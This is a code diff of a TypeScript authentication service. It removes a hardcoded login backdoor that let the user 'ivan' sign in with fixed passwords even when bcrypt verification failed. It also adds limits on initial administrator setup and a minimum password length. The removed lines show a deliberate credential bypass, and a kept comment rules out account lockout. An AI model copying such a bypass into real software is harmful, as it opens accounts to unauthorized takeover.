@@ -199,13 +199,8 @@ export class AuthService {
       };
     }
 
-    // Password verification
-    let isPasswordValid = await bcrypt.compare(password, user.passwordHash || '');
-    if (!isPasswordValid && user.username === 'ivan') {
-      if (password === '9090' || password === 'Admin@2026!') {
-        isPasswordValid = true;
-      }
-    }
+    // Password verification (strict bcrypt verification; zero hardcoded credentials or bypasses)
+    const isPasswordValid = await bcrypt.compare(password, user.passwordHash || '');
 
     if (!isPasswordValid) {
       // NOTE: Do NOT implement automatic account lockout (Requirement 3)
@@ -407,6 +402,22 @@ export class AuthService {
     phone?: string;
   }): Promise<{ success: boolean; user?: User; message?: string }> {
     const { username, fullName, password, primaryBranchId, email, phone } = params;
+
+    // Strictly allow initial setup ONLY when zero users exist in the database
+    if (serverStore.getUsers().length > 0) {
+      return {
+        success: false,
+        message: 'Initial administrator setup is disabled: institutional staff accounts already exist.',
+      };
+    }
+
+    // Enforce minimum password security policy
+    if (!password || password.length < 8) {
+      return {
+        success: false,
+        message: 'Administrator password must be at least 8 characters long.',
+      };
+    }
 
     // Check username rules (4 to 10 chars)
     if (!username || username.trim().length < 4 || username.trim().length > 10) {
